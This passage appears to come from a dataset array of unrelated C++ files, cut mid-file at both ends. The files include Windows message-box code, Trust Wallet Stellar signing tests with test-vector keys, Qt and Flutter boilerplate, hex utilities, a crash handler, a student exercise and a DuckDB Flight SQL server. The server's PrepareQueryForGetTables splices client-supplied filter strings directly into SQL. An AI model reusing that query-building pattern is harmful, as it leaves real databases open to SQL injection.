&& 0 <= LoadIconWithScaleDown(0, pszName, \n\t\tGetSystemMetrics(SM_CXSMICON), GetSystemMetrics(SM_CYSMICON), &frame.hIcon))\n\t{\n\t\thhk = SetWindowsHookExW(WH_CBT, CBTProc, 0, GetCurrentThreadId());\n\t}\n\n\tint i = MessageBoxIndirect(&mbp);\n\n\tif (hhk) UnhookWindowsHookEx(hhk);\n\tif (frame.hIcon) DestroyIcon(frame.hIcon);\n\n\treturn i;\n}\n\nHMODULE GetNtMod()\n{\n\tstatic HMODULE s_hntmod;\n\tif (!s_hntmod)\n\t{\n\t\ts_hntmod = GetModuleHandle(L\"ntdll\");\n\t}\n\n\treturn s_hntmod;\n}\n\nint ShowErrorBox(HWND hwnd, HRESULT dwError, PCWSTR lpCaption)\n{\n\tint r = 0;\n\tLPCVOID lpSource = 0;\n\tULONG dwFlags = FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS;\n\n\tif ((dwError & FACILITY_NT_BIT) || (0 > dwError && HRESULT_FACILITY(dwError) == FACILITY_NULL))\n\t{\n\t\tdwError &= ~FACILITY_NT_BIT;\n__nt:\n\t\tdwFlags = FORMAT_MESSAGE_FROM_HMODULE | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS;\n\n\t\tlpSource = GetNtMod();\n\t}\n\n\tPWSTR lpText;\n\tif (FormatMessageW(dwFlags, lpSource, dwError, 0, (PWSTR)&lpText, 0, 0))\n\t{\n\t\tr = CustomMessageBox(hwnd, lpText, lpCaption, dwError ? MB_ICONERROR : MB_ICONINFORMATION);\n\t\tLocalFree(lpText);\n\t}\n\telse if (dwFlags & FORMAT_MESSAGE_FROM_SYSTEM)\n\t{\n\t\tgoto __nt;\n\t}\n\n\treturn r;\n}\n\nHRESULT GetLastErrorEx(ULONG dwError/* = GetLastError()*/)\n{\n\tNTSTATUS status = RtlGetLastNtStatus();\n\treturn RtlNtStatusToDosErrorNoTeb(status) == dwError ? HRESULT_FROM_NT(status) : dwError;\n}\n",
    "// SPDX-License-Identifier: Apache-2.0\n//\n// Copyright \u00a9 2017 Trust Wallet.\n\n#include \"TestUtilities.h\"\n\n#include \"HexCoding.h\"\n#include \"PrivateKey.h\"\n#include \"Stellar/Address.h\"\n#include \"proto/Stellar.pb.h\"\n#include <TrustWalletCore/TWAnySigner.h>\n#include <TrustWalletCore/TWStellarPassphrase.h>\n#include <gtest/gtest.h>\n\nusing namespace TW;\n\nnamespace TW::Stellar::tests {\n\nTEST(TWAnySingerStellar, Sign_Payment) {\n    auto key = parse_hex(\"59a313f46ef1c23a9e4f71cea10fc0c56a2a6bb8a4b9ea3d5348823e5a478722\");\n    Proto::SigningInput input;\n    input.set_passphrase(TWStellarPassphrase_Stellar);\n    input.set_account(\"GAE2SZV4VLGBAPRYRFV2VY7YYLYGYIP5I7OU7BSP6DJT7GAZ35OKFDYI\");\n    input.set_fee(1000);\n    input.set_sequence(2);\n    input.mutable_op_payment()->set_destination(\"GDCYBNRRPIHLHG7X7TKPUPAZ7WVUXCN3VO7WCCK64RIFV5XM5V5K4A52\");\n    input.mutable_op_payment()->set_amount(10000000);\n    input.set_private_key(key.data(), key.size());\n    auto& memoText = *input.mutable_memo_text();\n    memoText.set_text(\"Hello, world!\");\n\n    Proto::SigningOutput output;\n    ANY_SIGN(input, TWCoinTypeStellar);\n\n    EXPECT_EQ(output.signature(), \"AAAAAAmpZryqzBA+OIlrquP4wvBsIf1H3U+GT/DTP5gZ31yiAAAD6AAAAAAAAAACAAAAAAAAAAEAAAANSGVsbG8sIHdvcmxkIQAAAAAAAAEAAAAAAAAAAQAAAADFgLYxeg6zm/f81Po8Gf2rS4m7q79hCV7kUFr27O16rgAAAAAAAAAAAJiWgAAAAAAAAAABGd9cogAAAEBQQldEkYJ6rMvOHilkwFCYyroGGUvrNeWVqr/sn3iFFqgz91XxgUT0ou7bMSPRgPROfBYDfQCFfFxbcDPrrCwB\");\n}\n\nTEST(TWAnySingerStellar, Sign_Payment_66b5) {\n    auto key = parse_hex(\"3c0635f8638605aed6e461cf3fa2d508dd895df1a1655ff92c79bfbeaf88d4b9\");\n    PrivateKey privKey = PrivateKey(key);\n    PublicKey pubKey = privKey.getPublicKey(TWPublicKeyTypeED25519);\n    Address addr = Address(pubKey);\n    EXPECT_EQ(addr.string(), \"GDFEKJIFKUZP26SESUHZONAUJZMBSODVN2XBYN4KAGNHB7LX2OIXLPUL\");\n\n    Proto::SigningInput input;\n    input.set_passphrase(TWStellarPassphrase_Stellar);\n    input.set_account(\"GDFEKJIFKUZP26SESUHZONAUJZMBSODVN2XBYN4KAGNHB7LX2OIXLPUL\");\n    input.set_fee(1000);\n    input.set_sequence(144098454883270657);\n    input.mutable_op_payment()->set_destination(\"GA3ISGYIE2ZTH3UAKEKBVHBPKUSL3LT4UQ6C5CUGP2IM5F467O267KI7\");\n    input.mutable_op_payment()->set_amount(1000000);\n    input.set_private_key(key.data(), key.size());\n\n    Proto::SigningOutput output;\n    ANY_SIGN(input, TWCoinTypeStellar);\n\n    // curl \"https://horizon.stellar.org/transactions/66b5bca4b4293bdd85a6a559b08918482774b76bcc170b4533411f1d6422ce24\"\n    EXPECT_EQ(output.signature(), \"AAAAAMpFJQVVMv16RJUPlzQUTlgZOHVurhw3igGacP1305F1AAAD6AH/8MgAAAABAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAANokbCCazM+6AURQanC9VJL2ufKQ8LoqGfpDOl577te8AAAAAAAAAAAAPQkAAAAAAAAAAAXfTkXUAAABAM9Nhzr8iWKzqnHknrxSVoa4b2qzbTzgyE2+WWxg6XHH50xiFfmvtRKVhzp0Jg8PfhatOb6KNheKRWEw4OvqEDw==\");\n}\n\nTEST(TWAnySingerStellar, Sign_Payment_Asset_ea50) {\n    auto key = parse_hex(\"3c0635f8638605aed6e461cf3fa2d508dd895df1a1655ff92c79bfbeaf88d4b9\");\n    PrivateKey privKey = PrivateKey(key);\n    PublicKey pubKey = privKey.getPublicKey(TWPublicKeyTypeED25519);\n    Address addr = Address(pubKey);\n    EXPECT_EQ(addr.string(), \"GDFEKJIFKUZP26SESUHZONAUJZMBSODVN2XBYN4KAGNHB7LX2OIXLPUL\");\n\n    Proto::SigningInput input;\n    input.set_passphrase(TWStellarPassphrase_Stellar);\n    input.set_account(\"GDFEKJIFKUZP26SESUHZONAUJZMBSODVN2XBYN4KAGNHB7LX2OIXLPUL\");\n    input.set_fee(1000);\n    input.set_sequence(144098454883270661);\n    input.mutable_op_payment()->set_destination(\"GA3ISGYIE2ZTH3UAKEKBVHBPKUSL3LT4UQ6C5CUGP2IM5F467O267KI7\");\n    input.mutable_op_payment()->mutable_asset()->set_issuer(\"GA6HCMBLTZS5VYYBCATRBRZ3BZJMAFUDKYYF6AH6MVCMGWMRDNSWJPIH\");\n    input.mutable_op_payment()->mutable_asset()->set_alphanum4(\"MOBI\");\n    input.mutable_op_payment()->set_amount(12000000);\n    input.set_private_key(key.data(), key.size());\n\n    Proto::SigningOutput output;\n    ANY_SIGN(input, TWCoinTypeStellar);\n\n    // curl \"https://horizon.stellar.org/transactions/ea50884cd1288d2d5420065995d13d750d812258e0e79280c4033a434e625c99\n    EXPECT_EQ(output.signature(), \"AAAAAMpFJQVVMv16RJUPlzQUTlgZOHVurhw3igGacP1305F1AAAD6AH/8MgAAAAFAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAANokbCCazM+6AURQanC9VJL2ufKQ8LoqGfpDOl577te8AAAABTU9CSQAAAAA8cTArnmXa4wEQJxDHOw5SwBaDVjBfAP5lRMNZkRtlZAAAAAAAtxsAAAAAAAAAAAF305F1AAAAQEuWZZvKZuF6SMuSGIyfLqx5sn5O55+Kd489uP4g9jZH4UE7zZ4ME0+74I0BU8YDsYOmmxcfp/vdwTd+n3oGCQw=\");\n}\n\nTEST(TWAnySingerStellar, Sign_Change_Trust_ad9c) {\n    auto key = parse_hex(\"3c0635f8638605aed6e461cf3fa2d508dd895df1a1655ff92c79bfbeaf88d4b9\");\n    PrivateKey privKey = PrivateKey(key);\n    PublicKey pubKey = privKey.getPublicKey(TWPublicKeyTypeED25519);\n    Address addr = Address(pubKey);\n    EXPECT_EQ(addr.string(), \"GDFEKJIFKUZP26SESUHZONAUJZMBSODVN2XBYN4KAGNHB7LX2OIXLPUL\");\n\n    Proto::SigningInput input;\n    input.set_passphrase(TWStellarPassphrase_Stellar);\n    input.set_account(\"GDFEKJIFKUZP26SESUHZONAUJZMBSODVN2XBYN4KAGNHB7LX2OIXLPUL\");\n    input.set_fee(10000);\n    input.set_sequence(144098454883270659);\n    input.mutable_op_ch",
    "/****************************************************************************\n** Meta object code from reading C++ file 'mainwindow.h'\n**\n** Created by: The Qt Meta Object Compiler version 67 (Qt 5.15.15)\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#include <memory>\n#include \"../mainwindow.h\"\n#include <QtCore/qbytearray.h>\n#include <QtCore/qmetatype.h>\n#if !defined(Q_MOC_OUTPUT_REVISION)\n#error \"The header file 'mainwindow.h' doesn't include <QObject>.\"\n#elif Q_MOC_OUTPUT_REVISION != 67\n#error \"This file was generated using the moc from 5.15.15. It\"\n#error \"cannot be used with the include files from this version of Qt.\"\n#error \"(The moc has changed too much.)\"\n#endif\n\nQT_BEGIN_MOC_NAMESPACE\nQT_WARNING_PUSH\nQT_WARNING_DISABLE_DEPRECATED\nstruct qt_meta_stringdata_MainWindow_t {\n    QByteArrayData data[8];\n    char stringdata0[147];\n};\n#define QT_MOC_LITERAL(idx, ofs, len) \\\n    Q_STATIC_BYTE_ARRAY_DATA_HEADER_INITIALIZER_WITH_OFFSET(len, \\\n    qptrdiff(offsetof(qt_meta_stringdata_MainWindow_t, stringdata0) + ofs \\\n        - idx * sizeof(QByteArrayData)) \\\n    )\nstatic const qt_meta_stringdata_MainWindow_t qt_meta_stringdata_MainWindow = {\n    {\nQT_MOC_LITERAL(0, 0, 10), // \"MainWindow\"\nQT_MOC_LITERAL(1, 11, 12), // \"processFrame\"\nQT_MOC_LITERAL(2, 24, 0), // \"\"\nQT_MOC_LITERAL(3, 25, 21), // \"on_playButton_clicked\"\nQT_MOC_LITERAL(4, 47, 22), // \"on_pauseButton_clicked\"\nQT_MOC_LITERAL(5, 70, 22), // \"on_resetButton_clicked\"\nQT_MOC_LITERAL(6, 93, 23), // \"on_actionExit_triggered\"\nQT_MOC_LITERAL(7, 117, 29) // \"on_saveSnapshotButton_clicked\"\n\n    },\n    \"MainWindow\\0processFrame\\0\\0on_playButton_clicked\\0\"\n    \"on_pauseButton_clicked\\0on_resetButton_clicked\\0\"\n    \"on_actionExit_triggered\\0\"\n    \"on_saveSnapshotButton_clicked\"\n};\n#undef QT_MOC_LITERAL\n\nstatic const uint qt_meta_data_MainWindow[] = {\n\n // content:\n       8,       // revision\n       0,       // classname\n       0,    0, // classinfo\n       6,   14, // methods\n       0,    0, // properties\n       0,    0, // enums/sets\n       0,    0, // constructors\n       0,       // flags\n       0,       // signalCount\n\n // slots: name, argc, parameters, tag, flags\n       1,    0,   44,    2, 0x08 /* Private */,\n       3,    0,   45,    2, 0x08 /* Private */,\n       4,    0,   46,    2, 0x08 /* Private */,\n       5,    0,   47,    2, 0x08 /* Private */,\n       6,    0,   48,    2, 0x08 /* Private */,\n       7,    0,   49,    2, 0x08 /* Private */,\n\n // slots: parameters\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n\n       0        // eod\n};\n\nvoid MainWindow::qt_static_metacall(QObject *_o, QMetaObject::Call _c, int _id, void **_a)\n{\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        auto *_t = static_cast<MainWindow *>(_o);\n        (void)_t;\n        switch (_id) {\n        case 0: _t->processFrame(); break;\n        case 1: _t->on_playButton_clicked(); break;\n        case 2: _t->on_pauseButton_clicked(); break;\n        case 3: _t->on_resetButton_clicked(); break;\n        case 4: _t->on_actionExit_triggered(); break;\n        case 5: _t->on_saveSnapshotButton_clicked(); break;\n        default: ;\n        }\n    }\n    (void)_a;\n}\n\nQT_INIT_METAOBJECT const QMetaObject MainWindow::staticMetaObject = { {\n    QMetaObject::SuperData::link<QMainWindow::staticMetaObject>(),\n    qt_meta_stringdata_MainWindow.data,\n    qt_meta_data_MainWindow,\n    qt_static_metacall,\n    nullptr,\n    nullptr\n} };\n\n\nconst QMetaObject *MainWindow::metaObject() const\n{\n    return QObject::d_ptr->metaObject ? QObject::d_ptr->dynamicMetaObject() : &staticMetaObject;\n}\n\nvoid *MainWindow::qt_metacast(const char *_clname)\n{\n    if (!_clname) return nullptr;\n    if (!strcmp(_clname, qt_meta_stringdata_MainWindow.stringdata0))\n        return static_cast<void*>(this);\n    return QMainWindow::qt_metacast(_clname);\n}\n\nint MainWindow::qt_metacall(QMetaObject::Call _c, int _id, void **_a)\n{\n    _id = QMainWindow::qt_metacall(_c, _id, _a);\n    if (_id < 0)\n        return _id;\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        if (_id < 6)\n            qt_static_metacall(this, _c, _id, _a);\n        _id -= 6;\n    } else if (_c == QMetaObject::RegisterMethodArgumentMetaType) {\n        if (_id < 6)\n            *reinterpret_cast<int*>(_a[0]) = -1;\n        _id -= 6;\n    }\n    return _id;\n}\nQT_WARNING_POP\nQT_END_MOC_NAMESPACE\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"qr_scanner\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"KittyUtils.h\"\n\nstatic void xtrim(std::string &hex){\n    if(hex.compare(0, 2, \"0x\") == 0){\n        hex.erase(0, 2);\n    }\n\n    // https://www.techiedelight.com/remove-whitespaces-string-cpp/\n    hex.erase(std::remove_if(hex.begin(), hex.end(), [](char c){\n\t\t\t\t\t\t\t\treturn (c == ' ' || c == '\\n' || c == '\\r' ||\n\t\t\t\t\t\t\t\t\t\tc == '\\t' || c == '\\v' || c == '\\f');\n\t\t\t\t\t\t\t}),\n\t\t\t\t\t\t\thex.end());\n}\n\n\nbool KittyUtils::validateHexString(std::string &xstr){\n    if(xstr.length() < 2) return false;\n    xtrim(xstr); // first remove spaces\n    if(xstr.length() % 2 != 0) return false;\n    for(size_t i = 0; i < xstr.length(); i++){\n        if(!std::isxdigit((unsigned char)xstr[i])){\n            return false;\n        }\n    }\n    return true;\n}\n\n\n// https://tweex.net/post/c-anything-tofrom-a-hex-string/\n#include <sstream>\n#include <iomanip>\n\n\n// ------------------------------------------------------------------\n/*!\n    Convert a block of data to a hex string\n*/\nvoid KittyUtils::toHex(\n    void *const data,           //!< Data to convert\n    const size_t dataLength,    //!< Length of the data to convert\n    std::string &dest           //!< Destination string\n    )\n{\n    unsigned char     *byteData = reinterpret_cast<unsigned char*>(data);\n    std::stringstream hexStringStream;\n    \n    hexStringStream << std::hex << std::setfill('0');\n    for(size_t index = 0; index < dataLength; ++index)\n        hexStringStream << std::setw(2) << static_cast<int>(byteData[index]);\n    dest = hexStringStream.str();\n}\n\n\n// ------------------------------------------------------------------\n/*!\n    Convert a hex string to a block of data\n*/\nvoid KittyUtils::fromHex(\n    const std::string &in,     //!< Input hex string\n    void *const data           //!< Data store\n    )\n{\n    size_t          length    = in.length();\n    unsigned char   *byteData = reinterpret_cast<unsigned char*>(data);\n    \n    std::stringstream hexStringStream; hexStringStream >> std::hex;\n    for(size_t strIndex = 0, dataIndex = 0; strIndex < length; ++dataIndex)\n    {\n        // Read out and convert the string two characters at a time\n        const char tmpStr[3] = { in[strIndex++], in[strIndex++], 0 };\n\n        // Reset and fill the string stream\n        hexStringStream.clear();\n        hexStringStream.str(tmpStr);\n\n        // Do the conversion\n        int tmpValue = 0;\n        hexStringStream >> tmpValue;\n        byteData[dataIndex] = static_cast<unsigned char>(tmpValue);\n    }\n}",
    "#include <Utils/System/Exceptions.h>\n#include <Utils/System/Misc.h>\n#include <Utils/Logger/Logger.h>\n#include <Utils/Data/String.h>\n\n#include <string>\n#include <windows.h>\n#include <ImageHlp.h>\n#include <Psapi.h>\n\n\n// prax.\n\n\nLONG WINAPI TopLevelExceptionHandler(const PEXCEPTION_POINTERS pExceptionInfo)\n{\n    const std::string exceptionCode = \"Except. Code: \" + String::ToHex(pExceptionInfo->ExceptionRecord->ExceptionCode) + \"\\n\";\n    const std::string exceptionAddress = \"Except. Address: \" + String::ToHex(reinterpret_cast<uintptr_t>(pExceptionInfo->ExceptionRecord->ExceptionAddress)) + \"\\n\";\n    const std::string exceptionFlags = \"Except. Flags: \" + String::ToHex(pExceptionInfo->ExceptionRecord->ExceptionFlags) + \"\\n\";\n    const std::string exceptionParams = \"Except. Parameters: \" + String::ToHex(pExceptionInfo->ExceptionRecord->NumberParameters) + \"\\n\";\n    const std::string exceptionContextRecord = \"Except. Context: \" + String::ToHex(reinterpret_cast<uintptr_t>(pExceptionInfo->ContextRecord)) + \"\\n\";\n    \n    const std::string fullException = \"! EXECEPTION !\\n\" + exceptionCode + exceptionAddress + exceptionFlags + exceptionParams + exceptionContextRecord;\n\n    Logger::Write<LogLevel::ERR>(\"Exceptions\", fullException);\n\n    auto res = MessageBoxA(\n        nullptr,\n        (\n            exceptionCode +\n            exceptionAddress +\n            exceptionFlags +\n            exceptionParams +\n            exceptionContextRecord +\n            \"\\n\\n\" + \"Base offset: \" +\n            Misc::GetModuleOfAddress(reinterpret_cast<uintptr_t>(pExceptionInfo->ExceptionRecord->ExceptionAddress))\n        ).c_str(),\n        \"kaboom\", MB_RETRYCANCEL | MB_ICONERROR\n    );\n\n    if (res == IDRETRY)\n        return EXCEPTION_CONTINUE_EXECUTION;\n\n    MessageBoxA(nullptr, \"MCBE8 Crashed.\", \"kaboom\", MB_OK | MB_ICONERROR);\n\n    return EXCEPTION_EXECUTE_HANDLER;\n}\n\nvoid Exceptions::Init() {\n    Logger::Write<LogLevel::INFO>(\"Init\", \"Initialized exceptions filter\");\n    SetUnhandledExceptionFilter(TopLevelExceptionHandler);\n}\n",
    "//#include\"Q1.h\"\r\n#include\"Q2.h\"\r\n#include\"Q3.h\"\r\n\r\nint main() {\r\n\r\n\t//cout << \"*******  QUESTION 1  *******\\n\\n\";\r\n\t//shape* s1 = new triangle (\"Triangle\", 0, 10,10);\r\n\t//shape* s2 = new Rectangle (\"Rectangle\", 5, 10);\r\n\t//shape* s3 = new circle (\"Circle\", 0, 0, 5);\r\n\r\n\t//s1->display();\r\n\t//cout << s1->area() << endl;\r\n\t//\r\n\t//s2->display();\r\n\t//cout << s2->area() << endl;\r\n\t//\r\n\t//s3->display();\r\n\t//cout << s3->area() << endl<<endl;\r\n\r\n\tcout << \"*******  QUESTION 2  *******\\n\\n\";\r\n\temployee* e1;\r\n\temployee* e2;\r\n\r\n\te1 = new driver(1, 10000);\r\n\te2 = new developer(2, 60000);\r\n\r\n\tcout << \"Driver salary : \" << e1->getSalary() << endl;\r\n\tcout << \"Driver ID : \" << e1->getID() << endl << endl;\r\n\tcout << \"Developer salary : \" << e2->getSalary() << endl;\r\n\tcout << \"Developer ID : \" << e2->getID() << endl << endl;\r\n\t\r\n\tcout << \"*******  QUESTION 3  *******\\n\\n\";\r\n\r\n\r\n\tshape* s1 = new Rectangle(2, 3);\r\n\tshape* s2 = new Square(4);\r\n\r\n\tcout << \"Shape 1 area : \" << s1->getArea() << endl;\r\n\tcout << \"Shape 1 Perimeter : \" << s1->getPerimeter() << endl;\r\n\t\r\n\tcout << \"Shape 2 area : \" << s2->getArea() << endl;\r\n\tcout << \"Shape 2 Perimeter : \" << s2->getPerimeter() << endl;\r\n\r\n\r\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "// Licensed to the Apache Software Foundation (ASF) under one\n// or more contributor license agreements.  See the NOTICE file\n// distributed with this work for additional information\n// regarding copyright ownership.  The ASF licenses this file\n// to you under the Apache License, Version 2.0 (the\n// \"License\"); you may not use this file except in compliance\n// with the License.  You may obtain a copy of the License at\n//\n//   http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing,\n// software distributed under the License is distributed on an\n// \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n// KIND, either express or implied.  See the License for the\n// specific language governing permissions and limitations\n// under the License.\n\n#include \"duckdb_server.h\"\n\n#include <duckdb.hpp>\n\n#include <boost/algorithm/string.hpp>\n#include <map>\n#include <random>\n#include <sstream>\n#include <iostream>\n#include <mutex>\n\n#include <arrow/api.h>\n#include <arrow/flight/server.h>\n#include <arrow/flight/sql/server.h>\n#include <arrow/flight/types.h>\n\n#include \"duckdb_sql_info.h\"\n#include \"duckdb_statement.h\"\n#include \"duckdb_statement_batch_reader.h\"\n#include \"duckdb_tables_schema_batch_reader.h\"\n#include \"duckdb/main/prepared_statement.hpp\"\n#include \"duckdb/main/prepared_statement_data.hpp\"\n#include \"flight_sql_fwd.h\"\n\nusing arrow::Result;\nusing arrow::Status;\n\nnamespace sql = flight::sql;\n\nnamespace gizmosql::ddb {\nnamespace {\n\nstd::string PrepareQueryForGetTables(const sql::GetTables &command) {\n  std::stringstream table_query;\n\n  table_query\n      << \"SELECT table_catalog as catalog_name, table_schema as schema_name, table_name, \"\n         \"table_type FROM information_schema.tables where 1=1\";\n\n  table_query << \" and table_catalog = \"\n              << (command.catalog.has_value() ? \"'\" + command.catalog.value() + \"'\"\n                                              : \"CURRENT_DATABASE()\");\n\n  if (command.db_schema_filter_pattern.has_value()) {\n    table_query << \" and table_schema LIKE '\" << command.db_schema_filter_pattern.value()\n                << \"'\";\n  }\n\n  if (command.table_name_filter_pattern.has_value()) {\n    table_query << \" and table_name LIKE '\" << command.table_name_filter_pattern.value()\n                << \"'\";\n  }\n\n  if (!command.table_types.empty()) {\n    table_query << \" and table_type IN (\";\n    size_t size = command.table_types.size();\n    for (size_t i = 0; i < size; i++) {\n      table_query << \"'\" << command.table_types[i] << \"'\";\n      if (size - 1 != i) {\n        table_query << \",\";\n      }\n    }\n\n    table_query << \")\";\n  }\n\n  table_query << \" order by table_name\";\n  return table_query.str();\n}\n\nStatus SetParametersOnDuckDBStatement(std::shared_ptr<DuckDBStatement> stmt,\n                                      flight::FlightMessageReader *reader) {\n  while (true) {\n    ARROW_ASSIGN_OR_RAISE(flight::FlightStreamChunk chunk, reader->Next())\n    const std::shared_ptr<arrow::RecordBatch> &record_batch = chunk.data;\n    if (record_batch == nullptr) break;\n\n    const int64_t num_rows = record_batch->num_rows();\n    const int &num_columns = record_batch->num_columns();\n\n    for (int row_index = 0; row_index < num_rows; ++row_index) {\n      for (int column_index = 0; column_index < num_columns; ++column_index) {\n        const std::shared_ptr<arrow::Array> &column = record_batch->column(column_index);\n        ARROW_ASSIGN_OR_RAISE(std::shared_ptr<arrow::Scalar> scalar,\n                              column->GetScalar(row_index))\n\n        stmt->bind_parameters.push_back(scalar->ToString());\n      }\n    }\n  }\n\n  return Status::OK();\n}\n\nResult<std::unique_ptr<flight::FlightDataStream>> DoGetDuckDBQuery(\n    std::shared_ptr<duckdb::Connection> db, const std::string &query,\n    const std::shared_ptr<arrow::Schema> &schema) {\n  std::shared_ptr<DuckDBStatement> statement;\n\n  ARROW_ASSIGN_OR_RAISE(statement, DuckDBStatement::Create(db, query))\n\n  std::shared_ptr<DuckDBStatementBatchReader> reader;\n  ARROW_ASSIGN_OR_RAISE(reader, DuckDBStatementBatchReader::Create(statement, schema))\n\n  return std::make_unique<flight::RecordBatchStream>(reader);\n}\n\nResult<std::unique_ptr<flight::FlightInfo>> GetFlightInfoForCommand(\n    const flight::FlightDescriptor &descriptor,\n    const std::shared_ptr<arrow::Schema> &schema) {\n  std::vector<flight::FlightEndpoint> endpoints{\n      flight::FlightEndpoint{{descriptor.cmd}, {}}};\n  ARROW_ASSIGN_OR_RAISE(auto result,\n                        flight::FlightInfo::Make(*schema, descriptor, endpoints, -1, -1))\n\n  return std::make_unique<flight::FlightInfo>(result);\n}\n\nstd::string PrepareQueryForGetImportedOrExportedKeys(const std::string &filter) {\n  return R\"(SELECT * FROM (\n               SELECT fk.database_name                                                                         AS pk_catalog_name,\n                      fk.schema_name                                                                           AS pk_schema_name,\n   ",
    "#include \"Equation.h\"\n\nnamespace math {\n\nstd::shared_ptr<Operator> UnaryOperator::derevative(TokenType t, int deep) const\n{\n    if(!_sub_group->isParametrique(t, deep))\n        return nullptr;\n\n    auto unaryDerevative = _sub_group->derevative(t, deep);\n\n    switch (_t) {\n    case TokenType::bracket_gr:\n        return unaryDerevative;\n        break;\n    case TokenType::exp:\n        return clone() * unaryDerevative;\n        break;\n    case TokenType::minus:\n        return std::make_shared<UnaryOperator>(TokenType::minus, unaryDerevative);\n        break;\n    };\n\n    return  nullptr;\n}\n\nstd::string UnaryOperator::toString() const\n{\n    if(!_sub_group)\n        return \"\";\n\n    switch(_t)\n    {\n    case TokenType::minus:\n    {\n        if(auto sub =_sub_group->to<BinaryOperator>())\n        {\n            if(sub->_t != TokenType::ext)\n                return g_LiteralTokens.at(_t) + \"(\" + _sub_group->toString() + \")\";\n        }\n        break;\n    }\n    case TokenType::bracket_gr:\n        return \"(\" + _sub_group->toString() + \")\";\n    }\n    return g_LiteralTokens.at(_t) + _sub_group->toString();\n}\n\nstd::shared_ptr<Operator> Equation::tokenToOperator(std::shared_ptr<Token> token)\n{\n    if(!token)\n        throw std::runtime_error(\"Parser error.\");\n\n    if(token->_type == TokenType::var_di || token->_type == TokenType::var_mi || token->_type == TokenType::var_xi)\n        return std::make_shared<VariableOperator>(token->_type);\n\n    if(token->_type == TokenType::phi_i_1)\n        return std::make_shared<Functional>(_phi_i_1);\n\n    if(auto tokenV = std::dynamic_pointer_cast<TokenValue>(token))\n    {\n        if(tokenV->_v == 1.)\n            return std::make_shared<OneValueOperator>();\n        if(tokenV->_v == 2.)\n            return std::make_shared<SquareOperator>();\n\n        return std::make_shared<ConstantOperator>(tokenV->_v);\n    }\n\n    if(auto tokenG = std::dynamic_pointer_cast<TokenGroup>(token))\n    {\n        if(tokenG->_group.empty())\n            return nullptr;\n\n        switch (tokenG->_type) {\n        case TokenType::bracket_gr:\n            return std::make_shared<UnaryOperator>(tokenG->_type, tokenToOperator(*tokenG->_group.begin()));\n        case TokenType::exp_gr:\n            return std::make_shared<UnaryOperator>((*tokenG->_group.begin())->_type, tokenToOperator(*tokenG->_group.rbegin()));\n        case TokenType::single_minus_gr:\n            return std::make_shared<UnaryOperator>(TokenType::minus, tokenToOperator(*tokenG->_group.rbegin()));\n        case TokenType::ext_gr:\n            return std::make_shared<BinaryOperator>(TokenType::ext, tokenToOperator(*tokenG->_group.begin()),\n                                                    tokenToOperator(*tokenG->_group.rbegin()));\n        case TokenType::multipl_gr:\n            return std::make_shared<BinaryOperator>((*(++(tokenG->_group.begin())))->_type, 